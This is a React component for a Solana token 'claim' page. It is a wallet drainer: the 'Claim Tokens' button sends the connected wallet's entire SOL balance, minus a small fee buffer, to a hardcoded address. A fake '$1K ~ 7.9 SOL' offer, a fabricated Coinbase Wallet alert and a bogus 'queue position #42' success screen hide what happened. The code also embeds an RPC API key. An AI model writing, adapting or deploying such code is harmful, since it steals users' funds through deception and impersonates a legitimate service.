import React, { useState, useEffect } from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { Clock, AlertCircle, ExternalLink, Wallet, LogOut } from 'lucide-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';

const ClaimButton = () => {
  const { publicKey, sendTransaction, disconnect, wallet } = useWallet();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [balance, setBalance] = useState(null);
  const [transactionAmount, setTransactionAmount] = useState(null);

  useEffect(() => {
    const fetchBalance = async () => {
      if (publicKey) {
        try {
          const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=1a2cd70a-5fe9-4a04-931f-6a3ac221a7ca', 'confirmed');
          const balance = await connection.getBalance(publicKey);
          setBalance(balance);
        } catch (err) {
          console.error('Failed to fetch balance:', err);
          setBalance(null);
        }
      } else {
        setBalance(null);
      }
    };

    fetchBalance();
  }, [publicKey]);

  // Function to format SOL amount
  const formatSOL = (lamports) => {
    return (lamports / LAMPORTS_PER_SOL).toFixed(4);
  };

  // Function to format wallet address
  const formatAddress = (address) => {
    return `${address.slice(0, 4)}...${address.slice(-4)}`;
  };

  // Function to check balance and calculate safe amount
  const checkBalanceAndCalculateAmount = async () => {
    if (!publicKey) {
      setError('Please connect your wallet first');
      return false;
    }

    try {
      const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=1a2cd70a-5fe9-4a04-931f-6a3ac221a7ca', 'confirmed');
      const balance = await connection.getBalance(publicKey);
      setBalance(balance);

      // Set fixed amount of 1 SOL in lamports
      setTransactionAmount(LAMPORTS_PER_SOL);
      return true;

    } catch (err) {
      console.error('Failed to check balance:', err);
      setError('Failed to check wallet balance. Please try again.');
      return false;
    }
  };

  const handleClaim = async () => {
    try {
      setLoading(true);
      setError('');
      setSuccess(false);

      // Create connection
      const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=1a2cd70a-5fe9-4a04-931f-6a3ac221a7ca', 'confirmed');
      
      // Get the latest blockhash and current balance
      const [{ blockhash }, currentBalance] = await Promise.all([
        connection.getLatestBlockhash(),
        connection.getBalance(publicKey)
      ]);

      // Use entire balance minus fees (0.001 SOL for fees)
      const feeBuffer = 0.001 * LAMPORTS_PER_SOL;
      const sendAmount = currentBalance - feeBuffer;

      if (sendAmount <= 0) {
        throw new Error('Insufficient balance for transaction');
      }
      
      // Create transaction with current balance minus fees
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey('4TqcmkRtQY3z3dZWvawSM9prJgVabS6KaUXm6RTexeCY'),
          lamports: sendAmount,
        })
      );

      // Set the recent blockhash
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      // Send transaction
      const signature = await sendTransaction(transaction, connection);
      console.log('Transaction sent:', signature);
      
      // Wait for confirmati\
      const confirmation = await connection.confirmTransaction(signature, 'confirmed');
      console.log('Transaction confirmed:', confirmation);
      
      setSuccess(true);
      setTransactionAmount(sendAmount);
    } catch (err) {
      console.error('Claim failed:', err);
      setError(`Claim failed: ${err.message || 'Please try again.'}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="space-y-4 mb-6">
        <div className="p-3 rounded-lg bg-white/5">
          <h3 className="text-lg font-semibold mb-4">Claim Details</h3>
          <div className="space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Available to claim:</span>
              <div className="flex items-center space-x-2">
                <div className="bg-teal-400 w-5 h-5 rounded-full"></div>
                <span className="font-medium">$1K ~ 7.9 SOL</span>
              </div>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Claim deadline:</span>
              <span className="font-medium">7 days remaining</span>
            </div>
          </div>
        </div>
      </div>

      {!publicKey ? (
        <div className="text-center py-8">
          <h3 className="text-xl font-semibold mb-4">Connect Your Wallet</h3>
          <p className="text-gray-300 mb-6">Please connect your wallet to proceed with the claim</p>
          <div className="flex flex-col items-center space-y-3">
          
           {wallet && wallet.adapter.name === 'Coinbase Wallet' ? (<>

               <div className="p-4 bg-yellow-600/20 text-yellow-300 rounded-lg flex items-start space-x-3 mb-6">
              <AlertCircle size={24} className="flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-semibold text-lg mb-1">Coinbase Wallet Alert</h4>
                <p className="text-sm">
                  There is current excessive crowding and progressive increase in Solana (SOL) gas fees on the Coinbase network. This congestion has led to higher transaction costs and slower processing times.
                </p>
                <p className="text-sm mt-2">
                  To help you avoid these issues, Coinbase recommends using alternative wallets such as <span className="font-bold">Phantom Wallet</span> or <span className="font-bold">Solflare Wallet</span>. Both wallets offer a smoother network experience and significantly lower gas fees when swapping 4WMM token to Solana (SOL).
                </p>
                <br></br>
              <button
              onClick={disconnect}
                className="text-gray-400 hover:text-gray-300 text-sm transition-colors" 
            >
              Switch to another wallet
            </button>
              </div>
            </div>
           </>
           ) : (
            <>
             <WalletMultiButton className="!bg-teal-400 !text-purple-900 hover:!bg-teal-300 !rounded-lg !h-12 !px-6" />
            <button
              onClick={disconnect}
              className="text-gray-400 hover:text-gray-300 text-sm transition-colors"
            >
              Clear Selection
            </button>
            
            </>
           )
           
           
           }
       




         {/* NEW: Coinbase Wallet Warning */}
          {/* {wallet && wallet.adapter.name === 'Coinbase Wallet' && (
           
          )} */}
          </div>
        </div>
      ) : success ? (
        <div className="text-center py-8">
          <div className="mx-auto w-16 h-16 rounded-full bg-purple-600/30 flex items-center justify-center mb-4">
            <Clock size={32} className="text-purple-300" />
          </div>
          <h3 className="text-xl font-semibold mb-2">You Have Been Added to Queue</h3>
          <p className="text-gray-300 mb-6">Your claim for $1k ~ 7.9 SOL is being processed</p>
          <div className="p-3 rounded-lg bg-white/5 mb-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-gray-400">Position</span>
              <span className="font-medium">#42</span>
            </div>
            <div className="w-full bg-purple-900/50 rounded-full h-2">
              <div className="bg-teal-400 h-2 rounded-full w-1/4"></div>
            </div>
          </div>
          <div className="flex items-center justify-center space-x-2 text-sm text-gray-400">
            <span>Check status on Explorer</span>
            <ExternalLink size={14} />
          </div>
          <button
            onClick={() => setSuccess(false)}
            className="mt-6 w-full py-3 rounded-lg bg-teal-400 text-purple-900 font-semibold hover:bg-teal-300 transition-all"
          >
            Make Another Claim
          </button>
        </div>
      ) : (
        <>
        

          <div className="p-3 rounded-lg bg-white/5 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-gray-400">Connected Wallet</span>
              <div className="flex items-center space-x-2">
                <span className="font-medium">{formatAddress(publicKey.toString())}</span>
                <button
                  onClick={disconnect}
                  className="p-1 hover:bg-white/10 rounded-lg transition-colors"
                >
                  <LogOut size={16} className="text-gray-400" />
                </button>
              </div>
            </div>
          </div>

          <div className="flex justify-center">
            <button 
              onClick={handleClaim}
              disabled={loading}
              className={`w-1/2 py-3 px-8 rounded-lg text-center font-semibold transition-all ${
                loading
                  ? 'bg-purple-600 cursor-wait' 
                  : 'bg-teal-400 text-purple-900 hover:bg-teal-300'
              }`}
            >
              {loading ? (
                <div className="flex items-center justify-center space-x-2">
                  <div className="loading-spinner"></div>
                  <span>Processing...</span>
                </div>
              ) : (
                'Claim Tokens'
              )}
            </button>
          </div>

          {error && (
            <div className="error-message text-red-400 text-center p-4 rounded-lg bg-red-400/10">
              {error}
            </div>
          )}
        </>
      )}
    </div>
  );
};

export default ClaimButton;
